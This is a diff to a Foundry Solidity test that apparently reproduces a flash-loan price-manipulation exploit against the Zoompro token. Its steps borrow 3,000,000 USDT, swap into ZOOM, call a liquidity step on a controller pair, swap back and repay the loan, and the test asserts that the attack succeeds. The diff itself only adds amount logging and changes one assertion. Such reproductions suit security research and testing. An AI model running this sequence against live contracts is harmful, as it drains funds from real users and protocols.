@@ -355,14 +355,20 @@ contract ZoomproTestBase is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 3000000e18);
         borrow_usdt_owner(3000000e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", usdt.balanceOf(attacker));
+        emit log_named_uint("amt2", 1);
         swap_trader_attacker_usdt_zoom(usdt.balanceOf(attacker), 1);
         printBalance("After step1 ");
         addliquidity_controller_pair_fusdt_fusdt();
         printBalance("After step2 ");
+        emit log_named_uint("amt3", zoom.balanceOf(attacker));
+        emit log_named_uint("amt4", 1);
         swap_trader_attacker_zoom_usdt(zoom.balanceOf(attacker), 1);
         printBalance("After step3 ");
+        emit log_named_uint("amt5", (3000000e18 * 1003) / 1000);
         payback_usdt_owner((3000000e18 * 1003) / 1000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -384,7 +390,7 @@ contract ZoomproTestBase is Test, BlockLoader {
         addliquidity_controller_pair_fusdt_fusdt();
         swap_trader_attacker_zoom_usdt(amt3, amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
